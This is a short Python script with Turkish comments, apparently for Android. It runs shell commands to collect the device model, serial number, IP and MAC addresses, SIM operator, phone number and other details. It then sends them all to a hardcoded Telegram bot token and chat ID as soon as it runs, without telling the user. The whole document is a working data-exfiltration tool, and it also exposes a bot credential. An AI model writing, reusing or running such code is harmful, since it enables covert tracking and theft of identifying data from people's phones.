import os
import telebot

# 🔹 Telegram bot bilgileri
TOKEN = "7823207013:AAHMEmLrDirYtnGu43gX5BR8YrgVNrrTNQU"
CHAT_ID = "6202798562"
bot = telebot.TeleBot(TOKEN)

# 📌 1. Cihaz Bilgilerini Al
def get_system_info():
    # Model ve Üretici
    model = os.popen("getprop ro.product.model").read().strip()
    manufacturer = os.popen("getprop ro.product.manufacturer").read().strip()

    # Android sürümü
    android_version = os.popen("getprop ro.build.version.release").read().strip()

    # Ekran Çözünürlüğü
    screen_resolution = os.popen("wm size").read().strip()
    screen_density = os.popen("wm density").read().strip()

    # İşlemci (CPU) bilgileri
    cpu_info = os.popen("cat /proc/cpuinfo").read().strip()

    # RAM bilgileri
    ram_info = os.popen("cat /proc/meminfo | grep Mem").read().strip()

    # Depolama Bilgileri
    storage_info = os.popen("df -h /storage/emulated/0").read().strip()

    # IP Adresi
    ip_address = os.popen("ip a | grep 'inet ' | awk '{print $2}'").read().strip()

    # Wi-Fi MAC Adresi
    mac_address = os.popen("cat /sys/class/net/wlan0/address").read().strip()

    # Seri Numarası
    serial_number = os.popen("getprop ro.serialno").read().strip()

    # Batarya Durumu
    battery_info = os.popen("cat /sys/class/power_supply/battery/capacity").read().strip()

    # SIM Kart Bilgisi
    sim_info = os.popen("getprop gsm.operator.alpha").read().strip()

    # Telefon Numarası
    phone_number = os.popen("getprop gsm.phone.default").read().strip()

    # Wi-Fi Durumu
    wifi_status = os.popen("dumpsys wifi | grep 'Wi-Fi is'").read().strip()

    # Bilgileri birleştir
    info = f"""
📱 *Cihaz Bilgileri:*  
Model: {manufacturer} {model}  
Android Sürümü: {android_version}  
Ekran Çözünürlüğü: {screen_resolution}  
Ekran Yoğunluğu: {screen_density}  
CPU: {cpu_info}  
RAM: {ram_info}  
Depolama: {storage_info}  
IP Adresi: {ip_address}  
Wi-Fi MAC Adresi: {mac_address}  
Seri Numarası: {serial_number}  
Batarya Durumu: {battery_info}%  
SIM Bilgisi: {sim_info}  
Telefon Numarası: {phone_number}  
Wi-Fi Durumu: {wifi_status}
"""

    return info

# 📌 Telegram’a Gönder
def send_report():
    system_info = get_system_info()
    bot.send_message(CHAT_ID, system_info, parse_mode="Markdown")

# 📌 Çalıştır
send_report()
